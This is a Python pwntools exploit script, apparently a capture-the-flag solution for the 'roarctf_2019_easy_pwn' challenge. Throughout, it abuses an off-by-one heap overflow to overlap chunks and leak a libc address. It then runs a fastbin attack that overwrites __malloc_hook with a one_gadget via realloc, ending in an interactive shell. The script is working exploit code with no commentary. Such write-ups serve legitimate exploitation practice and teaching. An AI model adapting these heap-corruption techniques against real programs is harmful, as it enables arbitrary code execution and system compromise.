#coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
sh = process("./roarctf_2019_easy_pwn")
# sh = remote("node3.buuoj.cn",25654)
elf = ELF("./roarctf_2019_easy_pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(size):
    sh.sendlineafter("choice: ","1")
    sh.recvuntil("size: ")
    sh.sendline(str(size))

def update(index,size,content):
    sh.sendlineafter("choice: ","2")
    sh.recvuntil("index: ")
    sh.sendline(str(index))
    sh.recvuntil("size: ")
    sh.sendline(str(size))
    sh.recvuntil("content: ")
    sh.sendline(str(content))

def dele(index):
    sh.sendlineafter("choice: ","3")
    sh.recvuntil("index: ")
    sh.sendline(str(index))

def show(index):
    sh.sendlineafter("choice: ","4")
    sh.recvuntil("index: ")
    sh.sendline(str(index))

add(0x18) #0
add(0x18) #1
add(0x88) #2
add(0x88) #3
add(0x28) #4
add(0x28) #5
add(0x68) #6
update(0,34,'a' * 0x18+p8(0xb1))
dele(1)
add(0xa8) #1
update(1,0x20,'a' * 0x18 + p64(0x91))
dele(2)
show(1)
sh.recvuntil("content: ")
sh.recv(0x20)
libc_base = u64(sh.recv(8)) - 0x3c4b78
log.info("success get libc_base:0x%x"%libc_base)
malloc_hook=libc_base+libc.sym['__malloc_hook']
realloc = libc_base + libc.symbols['__libc_realloc']
one_gadget=libc_base+0x4527a     #0x4527a 0xf0364 0xf1207

update(4,50,'a' * 0x28 + p8(0xa1))

dele(5)
dele(6)
add(0x98)

update(2,0x38,'a'*0x28+p64(0x71)+p64(malloc_hook-0x23))
add(0x68)#5
add(0x68)#6malloc_hook
update(6,27,'a'*(0x13-8)+p64(one_gadget)+p64(realloc))
add(1)
sh.interactive()